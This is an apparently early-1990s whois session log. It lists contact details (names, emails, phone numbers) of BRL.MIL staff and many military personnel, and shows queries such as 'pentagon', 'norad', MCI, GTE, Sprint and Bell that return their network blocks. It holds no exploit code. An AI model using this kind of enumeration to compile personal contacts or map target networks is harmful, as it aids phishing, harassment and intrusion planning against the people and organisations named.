Redden, Elizabeth (ER80)        eredden@HEL4.BRL.MIL            (DSN) 835-7414
Reeves, David (DR109)           dreeves@BRL.MIL                 (DSN) 470-3595
Reichard, Barry L. (BLR1)       reichard@BRL.MIL
                                  (410) 278-6660 (DSN) 298-6660 (FTS) 939-6660

----------

Reid, Arend H. (AHR1)           preid@BRL.MIL    (410) 278-6598 (DSN) 298-6598
Reimer, Gilles P. (GPR2)        greimer@APG-EMH5.APG.ARMY.MIL
                                                 (410) 273-7098 (302) 451-6784
Reimer, Sonya P. (SPR2)         sonya@BRL.MIL
                                    (410) 278-8676/6808 or (DSN) 298-8676/6808
Reitz, Richard G. (RGR16)       rreitz@HEL4.BRL.MIL
                                                 (DSN) 298-5855 (410) 278-5855
Reschly, Robert J., Jr. (RJR3)  reschly@BRL.MIL
                                       (410) 278-6808/8676 (DSN) 298-6808/8676
Rice, Betsy (BR63)              betsyr@BRL.MIL   (410) 278-6095 (DSN) 298-6095
Richer, Celine A. (CAR3)        cricher@HEL4.BRL.MIL
                                                 (410) 278-5818 (DSN) 298-5818
Rickter, Bruce A. (BAR2)        bar@BRL.MIL      (410) 278-6332 (DSN) 298-6254
Roach, Lisa K. (LKR)            lisa@BRL.MIL     (410) 278-6342 (DSN) 298-6342
Robbins, Frederick W. (FWR2)    robbins@BRL.MIL  (410) 278-6201 (DSN) 298-6201

----------

Rocchio, Joseph J. (JJR4)       ROCCHIO@BRL.MIL  (410) 278-6177 (DSN) 298-6177
Romelfanger, Frederick J. (FR13)fred@STSCI.EDU                  (410) 239-3586
Rosenblatt, Matthew A. (MAR13)  matt@BRL.MIL     (DSN) 298-4509 (410) 278-4509
Rothenbuhler, Robert E. (RER5)  rrothenb@BRL.MIL (DSN) 298-6740 (410) 278-6740
Rowe, Walter R. (WRR)           rowe@BRL.MIL                    (410) 278-6223
Rucker, Ingo E. (IER)           rucker@BRL.MIL   (410) 278-6722 (DSN) 298-6722
Runyeon, John W., Jr. (JWR2)    runyeon@BRL.MIL                 (410) 278-6568
Sacco, Elizabeth A. (EAS4)      bsacco@BRL.MIL                  (410) 278-6031
Santiago, Joseph M. (JMS3)      santiago@BRL.MIL                (410) 278-6042
Saucier, Richard (RS499)        saucier@BRL.MIL  (410) 278-6721 (DSN) 298-6721

----------

Scarborough, Mary G. (MGS4)     mgs@BRL.MIL                     (410) 278-6072
Schall, David R. (DRS6)         dschall@BRL.MIL  (410) 278-5713 (DSN) 298-5713
Scheidler, Michael J. (MJS2)    mjs@BRL.MIL                     (410) 278-6836
Schiller, Eckhard (ES143)       eschille@HEL4.BRL.MIL           (DSN) 464-6545
Schlegel, Eric S. (ESS)         ess@BRL.MIL                     (410) 278-3905
Scott, Howard L., III (HIS4)    hscott@BRL.MIL   (DSN) 298-6974 (410) 278-6974
Sebra, Randy (RS35)             Randy@BRL.MIL    (410) 278-7683 (DSN) 298-7683
Shames, Peter M. B. (PS16)      pshames@IPAC.CALTECH.EDU        (818) 584-2992
Sherrick, Thomas M. (TMS1)      SHERRICK@BRL.MIL                (410) 278-6015
Shires, Dale (DS336)            dshires@HEL4.BRL.MIL
                                                 (410) 278-5982 (DSN) 298-5982

----------

Shnidman, Robert (RS52)         robert@BRL.MIL   (410) 278-4081 (DSN) 298-4081
Silsby, Graham F. (GFS1)        gsilsby@BRL.MIL                 (410) 278-6012
Singapore, Mo (MS341)           msingapo@HEL4.BRL.MIL           (DSN) 786-6388
Slack, Wayne A. (WAS2)          slack@BRL.MIL                   (410) 278-4913
Smith, Dale M. (DMS2)           dsmith@BRL.MIL                  (410) 278-3061
Smith, Jill House (JHS4)        jill@BRL.MIL     (410) 278-6638 (DSN) 298-6638
Smith, Raymond C. (RCS15)       rcsmith@BRL.MIL  (DSN) 298-6368 (410) 278-6368
Spangler, James J. (JJS2)       spangler@BRL.MIL                (410) 278-6677
Spencer, Ronald A. (RAS34)      rspencer@HEL4.BRL.MIL
                                                 (410) 278-5818 (DSN) 298-5818
Sporay, Ralph J. (RJS9)         sporay@BRL.MIL
                                       (410) 278-6808/6461 (DSN) 298-6808/6461

----------

Starkenberg, John J. (JJS1)     jstar@BRL.MIL                   (410) 278-6214
Starks, Mike (MS19)             starks@BRL.MIL   (DSN) 298-6318 (410) 278-6318
Stay, Paul R. (PRS1)            stay@BRL.MIL     (DSN) 298-6640 (410) 278-6640
Stefferud, Einar (STEF)         STEF@BRL.MIL                    (714) 842-3711
Stegall, Steven R. (SRS2)       stegall@BRL.MIL                 (410) 278-6712
Stratton, Suzanne R. (SRS1)     stratton@BRL.MIL (410) 278-4387 (DSN) 298-4387
Street, Eugene M. (EMS25)       emstreet@APGEA.ARMY.MIL
                                                 (410) 671-2120 (DSN) 584-2120
Sturek, Walter B. (WBS1)        STUREK@BRL.MIL   (410) 278-4773 (DSN) 298-4773
Suckling, John H. (JHS6)        john@BRL.MIL     (410) 278-6649 (DSN) 298-6649
Sunderland, William B. (WBS3)   wbs@BRL.MIL                     (410) 278-4912

----------

Swoboda, Patrick M. (PMS31)     swoboda@BRL.MIL  (410) 278-6315 (DSN) 298-6315
Synnott, James N. (JNS2)        synnott@BRL.MIL                 (410) 278-6825
Tanenbaum, Paul J. (PJT)        pjt@BRL.MIL      (410) 278-6691 (DSN) 298-6691
Tauson, Richard Aaron (RAT2)    taus@HEL-ACE.BRL.MIL
                                                 (410) 278-5874 (DSN) 298-5874
Taylor, Betty E. (BET1)         bet@BRL.MIL                     (410) 278-6050
Testerman, Brenda K. (BKT2)     brendat@BRL.MIL                 (DSN) 298-6660
Tetreault, Laurent (LT11)       lt@BRL.MIL                      (410) 278-3061
Tice, Jerry L. (JLT4)           jer@BRL.MIL      (DSN) 298-6594 (410) 278-6594
Tingle, Glenna (GT2)            gtingle@BRL.MIL  (410) 278-6576 (DSN) 298-6576
Towson, David E. (DET)          TOWSON@BRL.MIL   (410) 278-6271 (DSN) 298-6271

----------

Turek, Christopher A. (CAT)     turek@BRL.MIL    (410) 278-6558 (DSN) 298-6558
Tyrol, Douglas E. (DET3)        tyrol@BRL.MIL
                         (DSN) 298-5890 or 298-5888 (410) 278-5890 or 278-5888
Vande Kieft, Lawrence J. (LJV)  ljv@BRL.MIL                     (410) 278-6212
Vogel, E. Michael (EMV)         vogel@BRL.MIL    (410) 278-2032 (DSN) 298-2032
Walbert, James N. (JNW)         jnw@BRL.MIL      (410) 278-6102 (DSN) 298-6102
Walker, E. Harris (EHW)         walker@BRL.MIL                  (410) 278-6213
Walker, Linda (LW181)           walkerl@BRL.MIL
                                       (DSN) 298-6869/6679 (410) 278-6869/6679
Walters, William P. (WPW2)      walters@BRL.MIL                 (410) 278-6062
Wantland, James B. (JBW9)       WANTLAND@BRL.MIL  (410) 295-5233 (DSN) 2955233
Ward, Beth (BW141)              beth@BRL.MIL     (410) 278-6721 (DSN) 298-6721

----------

Warren, John W. (JWW29)         WARREN@BRL.MIL   (410) 295-1690 (DSN) 295-1690
Watson, Jerry L. (JLW7)         jwatson@BRL.MIL                 (410) 278-6211
Weaver, Earl P. (EPW)           EARL@BRL.MIL
                                       (410) 278-7265/2032 (DSN) 298-7265/2032
Weeks, David (DW46)             weeks@BRL.MIL                   (410) 278-3061
Weinacht, Paul (PW18)           WEINACHT@BRL.MIL (410) 278-4280 (FTS) 987-4280
Westerman, Dean P. (DW102)      dean@HEL4.BRL.MIL(410) 278-5817 (DSN) 298-5817
White, Kevin J. (KJW16)         kwhite@BRL.MIL    (AV) 298-6184 (410) 278-6184
White, Kevin J. (KJW8)          kwhite@BRL.MIL    (AV) 298-6184 (410) 278-6184
White, Richard L. (RLW45)       white@@STSCI.EDU                (410) 338-4797
Wick, Charles H. (CHW2)         wick@BRL.MIL     (410) 278-6339 (DSN) 298-6339

----------

Winner, Wendy A. (WAW11)        wendy@BRL.MIL    (410) 278-6655 (DSN) 298-6655
Wood, Margaret A. (MAW11)       mwood@BRL.MIL   (DSN) 298-2728, (410) 278-2728
Wouk, Arthur (AW14)             WOUK@BRL.MIL     (919) 549-0641 (DSN) 935-3331
Wright, Thomas W. (TWW)         tww@BRL.MIL                     (410) 278-6046
Wright, William P. (WPW1)       wwright@BRL.MIL                 (410) 278-6570
Yeakel, William P. (WPY2)       yeakel@BRL.MIL   (401) 278-4371 (DSN) 298-4371
Young, Annie L. (ALY2)          ayoung@HEL4.BRL.MIL
                                                 (DSN) 298-7255 (410) 278-7255
Zimdars, Reed (RZ16)            rzimdars@BRL.MIL            011-49-9641-836344
Zimmerman, Kathleen L. (KLZ)    kathy@BRL.MIL                   (410) 278-6128
Zmurkewycz, Maria (MZ41)        mariaz@BRL.MIL
                                            (215) 597-8377 (DSN) 444-3808/3809

----------

Zoltani, Csaba (CZ11)           zoltani@BRL.MIL  (410) 278-6108 (DSN) 298-6108
Zubal, Orest (OZ)               zubal@HEL-ACE.BRL.MIL
                                                 (DSN) 298-5885 (410) 278-5885
de Rosset, William S. (WSD)     derosset@BRL.MIL (410) 278-6004, (DSN)298-6004

   Total of 373 records.

  Enter a handle, name, mailbox, or other field, optionally preceded
  by a keyword, like "host diis".  Type "?" for short, 2-page
  details, "HELP" for full documentation, or hit RETURN to exit.
---> Do ^E to show search progress, ^G to abort a search or output <---
Whois: pentagon
[No name] (PENTAGON)            PENTAGON-HQDADSS.ARMY.MIL           134.11.6.1
The Pentagon (PENTAGON-IMP)     26                                26.0.0.0    
Whois: sdn
Korea Advanced Institute of Science and Techonolgy (KAIST) (NET-SDN) SDN
                                                                   128.134.0.0
Neufer, Sonya D. (SDN)          SONYA@CANSTAR.COM              +1-416-756-4100
Whois: tele
[No name] (TELE)

   Hostname: TELE.FMHA.GOV
   Address: 146.120.170.30
   System: SUN running SUNOS

   Record last updated on 19-Mar-92.

Would you like to see the registered users of this host? y


   No registered users.
Whois: norad
No match for "NORAD".
Whois: sac
Cabelli, Scott A. (SAC37)       sac@RISC.ROCKWELL.COM           (805) 373-4706
Connelly, Sally A. (SAC)        connelly@PICA.ARMY.MIL
                                                 (201) 724-5083 (DSN) 880-5083
Whois: risc
RISC Management, Inc. (RISCMGT-DOM)                                RISCMGT.COM
Rockwell International Science Center (RISC) RISC.ROCKWELL.COM      130.50.4.1
Whois: mic
Grigni, Michelangelo (MG178)            mic@CS.UBC.CA
   UBC Dept of Computer Science
   6356 Agricultural Road
   Vancouver, BC V6T 1Z2
   CANADA
   (604) 822-8175

   Record last updated on 25-Mar-92.
Whois: sprint
SPRINT.NET (SPRINTLINK-DOM)                                     SPRINTLINK.NET
Sprint (NET-ICMNET-1)           ICMNET-1                          192.157.64.0
Sprint (NET-ICMNET-10)          ICMNET-10                         192.157.73.0
Sprint (NET-ICMNET-2)           ICMNET-2                          192.157.65.0
Sprint (NET-ICMNET-3)           ICMNET-3                          192.157.66.0
There are 24 more matches.  Show them? y
Sprint (NET-ICMNET-4)           ICMNET-4                          192.157.67.0
Sprint (NET-ICMNET-5)           ICMNET-5                          192.157.68.0
Sprint (NET-ICMNET-6)           ICMNET-6                          192.157.69.0
Sprint (NET-ICMNET-7)           ICMNET-7                          192.157.70.0
Sprint (NET-ICMNET-8)           ICMNET-8                          192.157.71.0
Sprint (NET-ICMNET-9)           ICMNET-9                          192.157.72.0
Sprint (NET-SPRINTLINK1)        SPRINTLINK1                        158.252.0.0
Sprint (NET-SPRINTLINK10)       SPRINTLINK10                      192.157.38.0
Sprint (NET-SPRINTLINK2)        SPRINTLINK2                        158.253.0.0
Sprint (NET-SPRINTLINK3)        SPRINTLINK3                        158.254.0.0
Sprint (NET-SPRINTLINK4)        SPRINTLINK4                       192.157.32.0
Sprint (NET-SPRINTLINK5)        SPRINTLINK5                       192.157.33.0
Sprint (NET-SPRINTLINK6)        SPRINTLINK6                       192.157.34.0
Sprint (NET-SPRINTLINK7)        SPRINTLINK7                       192.157.35.0
Sprint (NET-SPRINTLINK8)        SPRINTLINK8                       192.157.36.0
Sprint (NET-SPRINTLINK9)        SPRINTLINK9                       192.157.37.0
Sprint International (SPRINT)   SPRINT.COM                           35.1.1.62
Sprint International (SPRINT-DOM)                                   SPRINT.COM
Sprint International (COMPMAIL-DOM)                               COMPMAIL.COM
Sprint International (NET-SPRINT-INTL) SPRINT-INTL                  160.81.0.0
Sprint International (NET-SPRINT-INTL1) SPRINT-INTL1             192.156.192.0
Sprint International (NET-SPRINT-INTL2) SPRINT-INTL2             192.156.193.0
Sprint International (NET-SPRINT-INTL3) SPRINT-INTL3             192.156.194.0
Sprint International (NET-SPRINT-INTL4) SPRINT-INTL4             192.156.195.0
Whois: gte
GTE California (NET-GTE-CAL)    GTE-CAL                             144.28.0.0
GTE Communication Systems (NET-GTE-CS) GTE-CS                      130.131.0.0
GTE Data Services (NET-GTA-LAN) GTA-LAN                             143.63.0.0
GTE Data Services (NET-GTE-LAN) GTE-LAN                            192.80.52.0
GTE Data Services (NET-GTE-TELOPS) GTE-TELOPS                       138.83.0.0
There are 50 more matches.  Show them? y
GTE Data Services (NET-GTEDSWAN)GTEDSWAN                           159.161.0.0
GTE Directories Service Corporation (NET-DIRCONET) DIRCONET         158.95.0.0
GTE Federal Systems (NET-GTEFSD-COS0) GTEFSD-COS0                192.156.242.0
GTE Federal Systems (NET-GTEFSD-COS1) GTEFSD-COS1                192.156.243.0
GTE Federal Systems Division (NET-SCCNET) GTEFSD-ALT               192.5.220.0
GTE Federal Systems Division (GTEFSD-DOM)                           GTEFSD.COM
GTE Government Systems (NET-GTE-COL) GTE-COL                     192.147.233.0
GTE Government Systems (NET-GTE-JSSP) GTE-JSSP                    192.160.62.0
GTE Government Systems (NET-GTE-MARSC) GTE-MARSC                 192.152.245.0
GTE Government Systems (NET-GTE-NEEDHAM) GTE-NEEDHAM                155.95.0.0
GTE Government Systems (NET-GTE-ROCK1) GTE-ROCK1                  192.153.20.0
GTE Government Systems (NET-GTE-ROCK2) GTE-ROCK2                  192.153.21.0
GTE Government Systems (NET-GTE-ROCK3) GTE-ROCK3                  192.153.22.0
GTE Government Systems (NET-GTE-TAUNTON) GTE-TAUNTON               157.176.0.0
GTE Government Systems (NET-GTE-WALTHAM) GTE-WALTHAM               192.147.5.0
GTE Government Systems (NET-GTEECN) GTEECN                         192.5.164.0
GTE Government Systems Corp. (NET-GTE-GSC-NCS1) GTE-GSC-NCS1     192.133.124.0
GTE Government Systems Corp. (NET-GTE-GSC-NCSC) GTE-GSC-NCSC      192.133.51.0
GTE Government Systems Corporation (GTEGSC-DOM)                     GTEGSC.COM
GTE Government Systems ED/IIPO (GTEGSC-DDN) WLV.IIPO.GTEGSC.COM
                                          192.26.147.1, 192.73.3.1, 26.1.0.241
GTE Government Systems ED/IIPO (NET-ISS-ETHER) ISS-ETHER          192.48.143.0
GTE Government Systems ED/IIPO (NET-WLV-ETHER) WLV-ETHER          192.26.147.0
GTE Government Systems ED/IIPO (NET-WLV-ETHER-2) WLV-ETHER-2        192.73.3.0
GTE Government Systems, CSD (NET-CSD-GTE-LAN) CSD-GTE-LAN           192.31.1.0
GTE Government Systems, Electronic Defense Division (NET-GTE-MCSD) GTE-MCSD
                                                                 192.188.190.0
GTE Government Systems, Electronic Defense Division (NET-MTV-GSC-NET) MTV-GSC-NET
                                                                    156.23.0.0
GTE Hawaiian Tel (NET-GTE-HAWAII) GTE-HAWAII                       141.239.0.0
GTE Hawaiian Telephone Co. Inc. (NET-GTE-HAWAIIAN) GTE-HAWAIIAN  192.189.179.0
GTE Laboratories (NET-GTEL)     GTEL                               132.197.0.0
GTE Laboratories (NET-GTEXLABS) GTEXLABS                         192.146.129.0
GTE Laboratories (GTE-DOM)                                             GTE.COM
GTE Northwest Incorporated (NET-GTE-NORTHWST) GTE-NORTHWST           144.8.0.0
GTE Tele. Operations Hdqts. (GTETEL-DOM)                            GTETEL.COM
GTE Telecom, Inc. (GTETELE-DOM)                                    GTETELE.COM
GTE Telephone Operations (NET-GTE-LAN1) GTE-LAN1 192.195.156.0 - 192.195.165.0
GTE Telephone Operations (NET-GTE-NORTH) GTE-NORTH                  144.70.0.0
GTE Telephone Operations (NET-GTETELOPS-LAN) GTETELOPS-LAN          143.91.0.0
GTE Telephone Operations General Office (NET-GTE-TELOP) GTE-TELOP 192.136.14.0
GTE Telephone Operations General Office (NET-GTETELOPS1) GTETELOPS1
                                                                  192.138.90.0
GTE Telephone Operations General Office (NET-GTETELOPS10) GTETELOPS10
                                                                  192.138.99.0
GTE Telephone Operations General Office (NET-GTETELOPS2) GTETELOPS2
                                                                  192.138.91.0
GTE Telephone Operations General Office (NET-GTETELOPS3) GTETELOPS3
                                                                  192.138.92.0
GTE Telephone Operations General Office (NET-GTETELOPS4) GTETELOPS4
                                                                  192.138.93.0
GTE Telephone Operations General Office (NET-GTETELOPS5) GTETELOPS5
                                                                  192.138.94.0
GTE Telephone Operations General Office (NET-GTETELOPS6) GTETELOPS6
                                                                  192.138.95.0
GTE Telephone Operations General Office (NET-GTETELOPS7) GTETELOPS7
                                                                  192.138.96.0
GTE Telephone Operations General Office (NET-GTETELOPS8) GTETELOPS8
                                                                  192.138.97.0
GTE Telephone Operations General Office (NET-GTETELOPS9) GTETELOPS9
                                                                  192.138.98.0
GTE of Florida (NET-GTE-TOSA)   GTE-TOSA                           136.151.0.0
GTE of Florida (NET-GTFL)       GTFL                                139.49.0.0
Whois: mci
MCI (Systems Engineering) (NET-MCI-NETCS) MCI-NETCS                 162.54.0.0
MCI Communications (NET-MCI)    MCI                               192.65.150.0
MCI Communications Corporation (MCIMAIL) MCIMAIL.COM              192.147.44.2
MCI Mail Operations (NET-MCIMAIL-DMZ) MCIMAIL-DMZ                 192.147.45.0
MCI Mail Operations (MCIMAIL-DOM)                                  MCIMAIL.COM
There are 12 more matches.  Show them? y
MCI Telecommunications (NET-MCI-SHNET) MCI-SHNET                 192.138.175.0
MCI Telecommunications (NET-MCISOUTHFLD) MCISOUTHFLD             192.132.246.0
MCI Telecommunications (MCI-DOM)                                       MCI.COM
MCI Telecommunications Corp. (NET-NET-MCI1) NET-MCI1              192.135.71.0
MCI Telecommunications Corp. (NET-NET-MCI2) NET-MCI2              192.135.72.0
MCI Telecommunications Corp. (NET-NET-MCI3) NET-MCI3              192.135.73.0
MCI Telecommunications Corp. (NET-NET-MCI4) NET-MCI4              192.135.74.0
MCI Telecommunications Corp. (NET-NET-MCI5) NET-MCI5              192.135.75.0
MCI Telecommunications Corporation (NET-MCI-INT-NET) MCI-INT-NET   146.170.0.0
MCI Telecommunications Corporation (NET-MCI-TEXAS) MCI-TEXAS
                                                   192.201.1.0 - 192.201.255.0
MCI Telecommunications Inc. (MCI)
MCI Telecommunications Network Support (NET-MCI-DSN) MCI-DSN        159.24.0.0
Whois: att
AT&T Bell Laboratories (NET-ATT)
   6200 East Broad Street
   Columbus, OH 43213

   Netname: ATT
   Netnumber: 12.0.0.0

   Coordinator:
      Horton, Mark  (MH82)  Mark.Horton@ATT.COM
      (614) 860-4276

   Record last updated on 03-Jan-91.

Would you like to see the known hosts on this network? y


   No hosts found on this network.
Whois: bell
BELL, JENNIFER L. (JLB6)                          (605) 385-2424 DSN: 675-2424
BELL, MICHAEL (MB21)            HOODISSO@ST-LOUIS-EMH4.ARMY.MIL   817-287-2863
Bell Atlantic (NET-BELLATLANTIC)BELLATLANTIC                     192.138.167.0
Bell Atlantic (NET-BELL-ATLANTIC) BELL-ATLANTIC        
                                                     141.149.0.0 - 141.158.0.0
Bell Atlantic (NET-BELL-ATLANTIC1) BELL-ATLANTIC1       
                                                     151.196.0.0 - 151.205.0.0
There are 170 more matches.  Show them? y
Bell Atlantic Company (BELL-ATL-DOM)                              BELL-ATL.COM
Bell Atlantic Corp. (NET-BELL-ATL-COM) BELL-ATL-COM                192.133.3.0
Bell Atlantic Corporate Communications (NET-BELL-BLUE) BELL-BLUE    138.88.0.0
Bell Atlantic Corporate Communications (NET-BELL-RED) BELL-RED      138.89.0.0
Bell Atlantic Corporation (BAGATE) BAGATE.BELL-ATL.COM             140.108.1.1
Bell Atlantic Corporation (NET-BELL-ATL) BELL-ATL                  140.108.0.0
Bell Atlantic Corporation (NET-SINET-NET) SINET-NET                163.190.0.0
Bell Atlantic Directory Graphics (NET-BADG) BADG                  192.149.61.0
Bell Atlantic Healthcare Systems Inc. (NET-BELLAHS) BELLAHS         147.15.0.0
Bell Atlantic Healthcare Systems, Inc. (BELLAHS-DOM)               BELLAHS.COM
Bell Atlantic Information Services (NET-BA-INFOSVCS) BA-INFOSVCS 192.195.218.0
Bell Atlantic Knowledge Systems (NET-BAKS) BAKS                   192.52.186.0
Bell Canada (SHIVA-CA)          SHIVA.QE.BELL.CA                  138.82.179.1
Bell Canada (NET-BELL-CA)       BELL-CA                             138.82.0.0
Bell Canada (NET-BELLQE)        BELLQE                            192.52.108.0
Bell Canada (NET-TCSMS)         TCSMS                             192.75.163.0
Bell Canada (NET-TCSMS1)        TCSMS1                            192.75.164.0
Bell Canada (NET-TELECOM1)      TELECOM1                            142.95.0.0
Bell Canada (NET-TELECOM2)      TELECOM2                            142.96.0.0
Bell Cellular (NET-BELL)        BELL                             192.147.213.0
Bell Communications Research (BELLCORE-DOM)                       BELLCORE.COM
Bell Communications Research (NET-BELLCORE-NET) BELLCORE-NET        128.96.0.0
Bell Communications Research (NET-LCC-APOLLO) LCC-APOLLO            192.4.37.0
Bell Communications Research (NET-MRE-BIRDNET) MRE-BIRDNET          192.4.14.0
Bell Communications Research (NET-MRE-FRAGGLE) MRE-FRAGGLE          192.4.18.0
Bell Communications Research (NET-MRE-MERLOT) MRE-MERLOT            192.4.13.0
Bell Communications Research (NET-NVC-BB) NVC-BB                    192.4.34.0
Bell Communications Research (NET-NVC-SHARP) NVC-SHARP              192.4.32.0
Bell Northern Research (NET-BNR-TEST1) BNR-TEST1                  192.67.105.0
Bell Northern Research (NET-BNR-TEST2) BNR-TEST2                  192.67.106.0
Bell Telephone (PGHSUN)         PGHSUN.PREPNET.COM                 129.250.1.1
Bell Telephone (PHLSUN)         PHLSUN.PREPNET.COM                 129.250.2.1
Bell Telephone (PREPNET-DOM)                                       PREPNET.COM
Bell and Howell Phillipsburg Company (NET-BELLHOWELL) BELLHOWELL  192.94.248.0
Bell, Aaron E. (AEB5)                            (805) 277-2276 (DSN) 527-2276
Bell, Anne (AB138)                                              (DSN) 357-5011
Bell, Anthony (AB264)           ssb1aab@NMDSC10-BUMED.NAVY.MIL  (301) 295-0824
Bell, Arthur (AB229)            SWSCD@STRATHOST.STRATCOM.AF.MIL
                                                 (605) 385-6028 (DSN) 675-6028
Bell, Bob (BB56)                ativb@MANTA.NOSC.MIL            (804) 498-5692
Bell, Bobby (BB135)             bbell@ANNISTON-EMH1.ARMY.MIL
                                                          (205) 235-7749 (DSN)
Bell, Brenda L. (BLB23)         Bell325@FTAN.AF.MIL (DSN) 868-4459 or 868-3024
Bell, Brenda S. (BSB16)                          (514) 596-5101 (DSN) 581-5101
Bell, Bruce W. (BWB8)                                           (DSN) 865-4653
Bell, Carrol (CB223)                                            (213) 293-2720
Bell, Charles (CB357)                            (513) 257-6278 (DSN) 787-6278
Bell, Charles (CB64)            fastops@TECNET1.JCTE.JCS.MIL
                                                         805-989-8633 351-8652
Bell, Charles W. (CWB25)        BELLCW@AFSC-SSD.AF.MIL
                                                 (213) 363-0191 (DSN) 833-0191
Bell, Charlie L. (CLB70)        aeusg-sb-01@HEIDELBERG-EMH2.ARMY.MIL
                                                                 (AV) 370-8464
Bell, Christine A. (CAB54)      BELL@OCNR-HQ.NAVY.MIL           (703) 696-5086
Bell, Chuck (CB32)              osidsec@SAAD-EMH1.ARMY.MIL      (916) 388-2923
Bell, Clent E. (CEB1)           52TFWMSI@SPANGDAHLEM-PIV.AF.MIL (ETS) 452-6137
Bell, David (DB227)             BELLD@LEAV-EMH.ARMY.MIL
                                                 (913) 684-7780 (DSN) 552-7780
Bell, David (DB422)             bell@uwpg02.uwinnipeg.ca        (204) 786-9449
Bell, David Elliott (DEB2)      Bell@DOCKMASTER.NCSC.MIL        (301) 854-6889
Bell, David K. (DKB15)          eapb-sc@TAEGU-EMH1.ARMY.MIL     (DSN) 768-7309
Bell, David M. (DMB25)          DMBell@DOCKMASTER.NCSC.MIL      (301) 854-6889
Bell, Debra ANN (DAB8)          51MSC@OSAN-EMH.AF.MIL           (DSN) 784-6877
Bell, Dennis G. (DGB4)          LG433AMS@S5.INFO.WPAFB.AF.MIL    (AV) 945-8205
Bell, Donald R. (DRB11)         dbell@WSMR-EMH09.ARMY.MIL
                                                 (505) 678-1125 (DSN) 258-1125
Bell, Donna L. (DLB55)                                          (DSN) 284-5844
Bell, Doris J. (DJB63)          belld@DRACO.NOSC.MIL            (619) 553-3203
Bell, Douglas A. (DAB74)        dbell@PICA.ARMY.MIL
                                                 (201) 724-3975 (DSN) 880-3975
Bell, Douglas V. (DVB3)         PAFXPMX@AFMEA.AF.MIL            (DSN) 449-6351
Bell, Eric (EEB12)              BELLE@INDPLS-ASAFM1.ARMY.MIL
                                            (COM) (301)663-7447 (DSN) 343-7447
Bell, Ernest G. (EGB7)          BELLE@HQHSD.BROOKS.AF.MIL
                                                 (512) 536-2820 (DSN) 240-2820
Bell, Ernest L. (ELB12)         CMWC@NCTAMSLANT.NAVY.MIL
                                                 (803) 743-6195 (DSN) 563-6195
Bell, Frankie L. (FLB2)         ASQK-DB-IPF-IO@TAEGU-EMH1.ARMY.MIL  : 764-4353
Bell, Fred (FB52)               CISALASKA@SF-EMH1.ARMY.MIL
                                             (907) 862-4107 (DSN) 317-862-3219
Bell, Frederick J. (FJB20)                                      (DSN) 363-8129
Bell, Gary M. (GMB16)           IABDK-CX-CI-N-SAICS@SEOUL-EMH1.ARMY.MIL
                                                                (DSN) 723-4465
Bell, George F., Jr. (GFB1)     KISSGPM@STRATHOST.STRATCOM.AF.MIL
                                                 (906) 346-2855 (DSN) 472-2855
Bell, Gerald (GB214)            OOSCD6H@ST-LOUIS-GW3.ARMY.MIL
                                                 (817) 287-7403 (DSN) 737-7403
Bell, Glenn N. (GNB1)                                           (DSN) 434-4552
Bell, Greg (GB192)              GREG@YODA.EECS.WSU.EDU          (509) 335-2723
Bell, Harold (HB93)             a5401h@TECNET1.JCTE.JCS.MIL
                                                 (202) 746-2590 (DSN) 286-2590
Bell, Harry L. (HLB26)          BELLHA@UVAX6.DISA.MIL
                                                 (703) 696-1757 (DSN) 226-1757
Bell, Harton L. (HLB22)         EANC-NF-20T@SEOUL-EMH1.ARMY.MIL
Bell, Heidi (HB64)              th8311@WESTPOINT-EMH2.ARMY.MIL  (914) 938-5748
Bell, Helen M. (HMB19)          aetvcfr%fktmil@FRANKFURT-EMH1.ARMY.MIL
                                                                (DSN) 320-5763
Bell, Henry (HB12)              bellh@UVAX6.DISA.MIL
                                                 (DSN) 356-5341 (703) 285-5341
Bell, Herb (HB16)               HBELL@CHARM.ISI.EDU             (602) 988-6561
Bell, Herman (HB121)            TACPAX@S5.INFO.WPAFB.AF.MIL      (AV) 574-7019
Bell, Hiram, Jr. (HB54)         afzs-pao@DRUM-EMH1.ARMY.MIL
                                                 (315) 772-5461 (DSN) 341-5461
Bell, Honor (HB8)               CNETLLE@NCTAMSLANT.NAVY.MIL
                                                 (904) 452-4837 (DSN) 922-4837
Bell, Jack (JB124)              HALLEY.UUCP!JACK@CS.UTEXAS.EDU  (512) 244-8281
Bell, Jackie L. (JLB25)         90SUPSLGSF@STRATHOST.STRATCOM.AF.MIL
                                                 (307) 775-3828 (DSN) 481-3828
Bell, Jacqueline L. (JLB19)     jlb@LANL.GOV                    (202) 325-0771
Bell, James (JB165)             jbell@LOGDIS1.HQ.AFLC.AF.MIL    (DSN) 449-9986
Bell, James R. (JRB)            CSLA-EUR@MONMOUTH-EMH2.ARMY.MIL (879) 538-8090
Bell, James V. (JVB7)           SIMA7_032@SEAA.NAVSEA.NAVY.MIL  (213) 547-5359
Bell, Jan (JB184)                            (502) 624-3055 (DSN) 312-464-3055
Bell, Jarvis E. (JEB80)         8TFWLGT@OSAN-EMH.AF.MIL         (DSN) 782-4114
Bell, Jennifer L. (JLB62)                        (605) 385-2424 (DSN) 675-2424
Bell, Jerry W. (JWB63)          apaj-cgb@ZAMA-EMH1.ARMY.MIL     (DSN) 233-8505
Bell, Jimmy C. (JCB22)          bellj@GORDON-EMH1.ARMY.MIL
                                                 (706) 791-6706 (DSN) 780-6706
Bell, Joanne (JB4)              JBELL@CCK.BBN.COM               (617) 873-3868
Bell, John (JB710)              flanglgs@TACHOST.AF.MIL         (DSN) 460-7401
Bell, John A. (JAB113)          jabell@TECNET1.JCTE.JCS.MIL
                                                 (402) 294-6855 (DSN) 271-6855
Bell, John B. (JBB10)           BELL@NAVRESFOR.NAVY.MIL
                                                 (916) 388-2122 (DSN) 839-2122
Bell, John B. (JBB30)           604306@LANL.GOV                 (415) 422-7105
Bell, John J. (JJB17)           AMSEL-LC-ME-L@MONMOUTH-EMH2.ARMY.MIL    X25499
Bell, John Michael (JMB2)       jbell@FTSILL-AMEDD.ARMY.MIL
                                                      (405)351-0788 (639)-0788
Bell, John W. (JWB26)                                803-668-5105 DSN 965-5105
Bell, Jonathan M. (JMB115)                                      +64-4-474-3000
Bell, Juanita (JB153)           SSO@ST-LOUIS-EMH4.ARMY.MIL            337-5372
Bell, Karen (KB33)              317TAW@AFCP1.ACFP.AF.MIL          919-394-4235
Bell, Katrina (KB96)                             (206) 396-2471 (DSN) 744-2471
Bell, Kenneth D. (KDB6)         bell@WRAIR-EMH1.ARMY.MIL        (202) 576-3148
Bell, Kenneth E. (KEB16)        C14KEB@CCF.NRL.NAVY.MIL         (202) 767-6275
Bell, Kevin M. (KMB31)                           (719) 472-2582 (DSN) 259-2582
Bell, Larry N. (LNB4)           bell@AFCC-OA1.AF.MIL
